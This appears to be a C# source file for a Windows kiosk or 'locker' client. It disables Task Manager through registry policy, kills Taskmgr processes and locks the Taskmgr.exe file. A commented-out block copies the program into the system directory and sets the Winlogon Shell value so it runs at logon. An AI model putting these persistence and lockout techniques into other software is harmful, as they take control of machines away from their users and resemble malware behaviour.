using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using Microsoft.Win32;
using System.IO;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace TestBrowseClient1
{
    class Program
    {
        static void Main(string[] args)
        {
            /*if (Environment.MachineName.ToLower() != "Fcis".ToLower())
            {
                Process.Start(System.Windows.Forms.Application.ExecutablePath.Substring(0,3));
                
                TaskManager(false);
                string NewPath=Environment.SystemDirectory + "\\" + Application.ExecutablePath.Substring(Application.ExecutablePath.LastIndexOf('\\') + 1);
                if (!File.Exists(NewPath))
                {
                    File.Copy(Application.ExecutablePath,NewPath);
                }
                else 
                {
                    Wrapper.KillMySelf(NewPath);
                    Thread.Sleep(1000);
                    File.Copy(Application.ExecutablePath,NewPath);
                }
                Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell", (object)("explorer.exe " + System.Windows.Forms.Application.ExecutablePath));
            }*/
            ManualResetEvent ar = new ManualResetEvent(false);
            Wrapper p = new Wrapper(ar);
            p.Run();
            ar.WaitOne(Timeout.Infinite,true);
        }
        /// <summary>
        /// TaskManager used to enable or disable the task manager, some people will wonder what is the use of it, we create new desktop, which
        /// dosn't contain hotkeys or task manager, so why we use it? the answer is when you press Ctrl + Alt + Del in new created desktop, the 
        /// task manager will appear in default task manager, so after the locker closed you will find the task manager, so I cancel it from
        /// registery for maximum security and also open the file for binary and lock read, write to disable msgbox telling me that task manager
        /// stopped by admin.
        /// </summary>
        /// <param name="Enabled">Bool value specify if taskmanager enabled or disabled.</param>
        static void TaskManager(bool Enabled)
        {
            FileStream TaskMan=null;
            if (GetWinVersion()[0] == "WinNT")
            {   
                RegistryKey RegKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                RegKey.SetValue("DisableTaskMgr", !Enabled, RegistryValueKind.DWord); RegKey.Close();
                if (GetWinVersion()[1] == "Win2000")
                {
                    RegKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Group Policy Objects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Policies\System");
                    RegKey.SetValue("DisableTaskMgr", !Enabled, RegistryValueKind.DWord); RegKey.Close();
                }
                /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                if (!Enabled)
                {
                    for (int I = 0; I < Process.GetProcesses().Length; I++)
                    {
                        if (Process.GetProcesses()[I].ProcessName.ToLower() == "Taskmgr".ToLower()) Process.GetProcesses()[I].Kill();
                        if (Process.GetProcesses()[I].MainWindowTitle.ToLower() == "Windowis Task Manager".ToLower()) Process.GetProcesses()[I].Kill();
                    }
                    TaskMan = File.Open(Environment.SystemDirectory + @"\Taskmgr.exe", FileMode.Open, FileAccess.Read, FileShare.None);
                }
                else if (TaskMan != null) TaskMan.Close();
            }
            else SystemParametersInfo(97, Enabled, Enabled, 0);
        }
        
        [DllImport("user32.dll")]
        static extern int SystemParametersInfo(int uAction, bool uParam, bool lpvParam, int fuWinIni);

        /// <summary>
        /// GetWinVersion used to get the windows version, we need this function for registary purpose, as we know in win-9x based OS, we can 
        /// cancle task manager by using SystemParametersInfo, but in NT we can't use it, so we have to know what version of windows we run.
        /// </summary>
        /// <returns>Return fixed array of string of size 2, the 1st string is the platform NT or 9X, the 2nd is the version name.</returns>
        static string[] GetWinVersion()
        {
            string Platform = ((int)Environment.OSVersion.Platform == 2) ? "WinNT" : (((int)Environment.OSVersion.Platform == 1) ? "Win" : "WinS");
            string OSVersion = (Environment.OSVersion.Version.Major.ToString() + "." + Environment.OSVersion.Version.Minor.ToString());
            OSVersion = (OSVersion == "5.1") ? "WinXP" : ((OSVersion == "5.0") ? "Win2000" : "Other");
            return (new string[2] { Platform, OSVersion });
        }

    }
}
